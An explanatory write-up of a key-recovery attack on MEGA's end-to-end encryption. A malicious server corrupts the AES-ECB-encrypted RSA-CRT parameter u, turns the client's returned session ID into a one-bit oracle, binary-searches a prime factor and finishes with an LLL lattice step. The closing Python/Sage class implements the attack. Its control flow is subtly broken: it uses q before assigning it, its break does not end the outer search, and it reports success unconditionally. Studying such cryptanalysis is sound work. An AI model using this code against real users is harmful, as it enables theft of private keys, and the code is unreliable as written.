# MEGA's Key Hierarchy 


- Claims User-Controlled End-to-End Encryption (UCE)
 - Encryption/decryption happens client-side; server should never see plaintext or keys

 ```
 User Password (PW)
       │
       ├─[PBKDF2-HMAC-SHA512]─► Authentication Key (k_a) ──► Server auth
       │
       └─[PBKDF2-HMAC-SHA512]─► Encryption Key (k_e)
                                      │
                                      ▼
                              Master Key (k_M) ◄── Random 128-bit
                                      │
              ┌───────────────────────┼───────────────────────┐
              ▼                       ▼                       ▼
    [AES-ECB under k_M]   [AES-ECB under k_M]   [AES-ECB under k_M]
              │                       │                       │
              ▼                       ▼                       ▼
    RSA Share Key Pair    Curve25519 Chat Key    Ed25519 Sign Key
    (for file sharing)    (for MEGAchat)         (for signing keys)
              │
              ▼
    Node Keys (per file/folder) ──► File Encryption
 ```

 All sensitive keys are encrypted with AES-ECB under the master key k_M and stored on MEGA's servers. No integrity protection is applied to these key ciphertexts.

 Standard RSA decryption: `m = c^d mod N`

RSA-CRT optimization (faster):

```
Given: N = p × q, d_p = d mod (p-1), d_q = d mod (q-1), u = q⁻¹ mod p

1. m_p = c^d_p mod p          # Decrypt in smaller ring Z_p
2. m_q = c^d_q mod q          # Decrypt in smaller ring Z_q  
3. t = (m_p - m_q) mod p
4. h = (t × u) mod p
5. m' = h × q + m_q           # Garner's formula: recombine
```

The attack exploits how RSA-CRT behaves when the u parameter is corrupted.

he session ID (SID) returned by the client acts as a padding oracle because:

  - Client truncates decrypted message to 43 bytes (the SID)
  - Different decryption results → different SIDs returned
  - Attacker observes the SID → learns partial information about decryption

MEGA gives every user an RSA-2048 key pair called the Share Key:

- pk_share (public) — used by others to share files/folders with you
- sk_share (private) — used by you to decrypt those shared files

The private key sk_share is stored on MEGA's servers, but encrypted under your Master Key using AES-ECB.

The private key is encoded as:

```
sk_encoded = |q| + q + |p| + p + |d| + d + |u| + u + Padding
```

| Field | Description | Size (RSA-2048) |
|-------|-------------|----------------|
| `q`   | Prime factor of N | 128 bytes |
| `p`   | Prime factor of N | 128 bytes |
| `d`   | Secret exponent `d = e⁻¹ mod φ(N)` | 256 bytes |
| `u`   | `u = q⁻¹ mod p` (CRT helper) | 128 bytes |
| `\|x\|` | 2-byte length encoding for each value | 2 bytes each |
| `P`   | Padding (to fill last AES block) | 8 bytes |

**Total = 41 AES blocks (16 bytes each)**

This encoded key is **AES-ECB encrypted** with the Master Key `k_M` and stored on MEGA's servers.

## 🔄 How RSA-CRT Decryption Works (Client Side)

When you log in, MEGA sends you:
1. `[sk_encoded]_kM` — your encrypted private key
2. `[m]_pkshare` — a Session ID (SID) encrypted under your RSA public key

The client does:

```
Step 1: Decrypt sk_encoded using AES-ECB with k_M
Step 2: Parse out q, p, d, u from sk_encoded

Step 3: m_p = c^(d_p) mod p       ← partial decryption mod p
Step 4: m_q = c^(d_q) mod q       ← partial decryption mod q
Step 5: t   = (m_p - m_q) mod p
Step 6: h   = (t × u) mod p
Step 7: m'  = h × q + m_q         ← final recovered message

Step 8: sid = m'[3:45]             ← extract 43 bytes as Session ID
        (client sends this sid back to server)
```

> `d_p = d mod (p-1)` and `d_q = d mod (q-1)` are computed from `d`.

The attacker (malicious MEGA server) wants to find `q` (a prime factor of `N = p × q`).

**Key Observation from RSA-CRT:**

| Condition | What Happens |
|-----------|-------------|
| `m < q`   | `m_q = m`, so `t = 0`, so `h = 0` → **correct decryption** → `sid = 0` |
| `m ≥ q`   | `t ≠ 0`, and since `u` was garbled → `h ≠ 0` → **wrong decryption** → `sid ≠ 0` |

This creates a **1-bit oracle per login**: "Is my chosen `m` less than `q` or not?"
## RSA Shared Key Recovery 

### Step 1: Garble `u` (Key Overwriting)

Since the key is encrypted with **AES-ECB**, each 16-byte block is independent.

The attacker modifies the **ciphertext blocks** corresponding to `u` in `[sk_encoded]_kM`.

- `u` spans **AES blocks 33–41** of the encoded key
- The attacker flips one of these ciphertext blocks (e.g., XORs it with something)
- The client will decrypt this to a **wrong value** `u' ≠ u`
- **Length encodings are preserved** (block 33 is avoided to keep parsing intact)
### Step 2: Binary Search for `q`

Now the attacker has a **case-distinction oracle** (Is `m < q`?).

**Binary Search Setup:**
- `q` is a **1024-bit prime**, so `q ∈ [2^1023, 2^1024 - 1]`
- Start: `low = 2^1023`, `up = 2^1024 - 1`

**Each Login Attempt:**
```
m = (low + up) / 2        ← pick midpoint
Send [m]_pk to client

If client returns sid == 0:
    → m < q  →  low = m   (q is in upper half)
Else:
    → m ≥ q  →  up  = m   (q is in lower half)
```

After **1023 iterations**, `low ≈ up ≈ q` → factor recovered!
## Step 3 (Optimization): Lattice Attack to Finish Early

Instead of doing all 1023 iterations, the attacker can **stop early** once enough MSBs of `q` are known, then use a **lattice attack** to recover the remaining bits.

#### How Many Bits Do We Need?
- For RSA-2048: recover the **top 683 bits** of `q` via binary search
- The remaining **341 bits** are recovered via lattice (LLL algorithm)

#### The Lattice Setup
Once we know the top bits of `q`, let:
- `q̂` = known upper bits of `q` (shifted: `q2 = q̂ × 2^l`)  
- `q1` = unknown lower `l` bits


We need to find the small root `q1` of:

```
f(x) = x + q2  (mod q)
```

Build a 3×3 lattice basis `B` with scaling `L = 2^l`:

```
B = | L²   L×q2   0  |
    |  0    L     q2 |
    |  0    0      N |
```

Apply **LLL reduction** → find short vector → factor polynomial → recover `q1`.

```python
class MegaRSAKeyRecoveryAttack():

    def __init__(self, pubk, ...):
        self.n, self.e = pubk           # RSA public key: modulus N, exponent e
        
        # Initialize binary search interval
        # q is a ~1024-bit prime, so it lives in [2^1023, 2^1024 - 1]
        self.low = 1 << (self.n.bit_length()//2 - 1)    # 2^1023
        self.up  = (1 << ((self.n.bit_length() + 1)//2)) - 1  # ~2^1024
        
        # How many bits can the lattice recover? (N^(1/6) bits)
        self.remaining_bits = floor_int_div(self.n.bit_length(), 6)  # 341 for RSA-2048


    def get_next_sid(self):
        """
        Generate the next encrypted 'm' to send to the client.
        m is the midpoint of our current search interval.
        """
        sid = (self.low + self.up) >> 1     # midpoint
        self.last_sid = sid
        sid_bytes = int_to_bytes(sid)
        
        # Encrypt m under the public key (raw RSA, no padding)
        return rsa_encrypt(sid_bytes, self.pubk, do_pad=False)


    def feed_response(self, r):
        """
        Process the SID returned by the client.
        r == 0 means m < q (correct decryption happened)
        r != 0 means m >= q (garbled decryption happened)
        """
        if r == 0:
            self.low = self.last_sid    # q is ABOVE midpoint → raise lower bound
        else:
            self.up = self.last_sid     # q is BELOW midpoint → lower upper bound

        # Check if interval is small enough for lattice attack
        if (self.up - self.low).bit_length() <= self.remaining_bits:
            # ---- LATTICE ATTACK ----
            for a in [self.up, self.low]:
                # Strip off the unknown lower bits
                a >>= self.remaining_bits
                a <<= self.remaining_bits

                R = (1 << self.remaining_bits)   # L = 2^l

                # Build 3x3 lattice matrix
                M = sage.matrix([
                    [R**2,  R*a,  0],    # coefficients of f1(x) = x² + a*x (scaled)
                    [0,     R,    a],    # coefficients of f2(x) = x + a (scaled)
                    [0,     0,    self.n] # f3(x) = N (the modulus)
                ])

                B = M.LLL()   # Apply LLL reduction to find short vector

                # Extract polynomial from shortest vector
                PR = sage.PolynomialRing(sage.ZZ, 'x')
                x  = PR.gen()
                v2 = B[0][0] / R**2
                v1 = B[0][1] / R
                v0 = B[0][2]
                Q  = v2*x**2 + v1*x + v0   # Polynomial whose root is the missing bits

                roots = Q.roots()
                for root, _ in roots:
                    q = a + int(root)
                    if q != 0 and self.n % q == 0 and 1 < q < self.n:
                        break   # Found q!

        # Verify and compute full private key
        p = self.n // q
        assert self.n == p * q
        assert isPrime(p) and isPrime(q)

        self.p, self.q = p, q
        return True   # Attack successful!
```
---







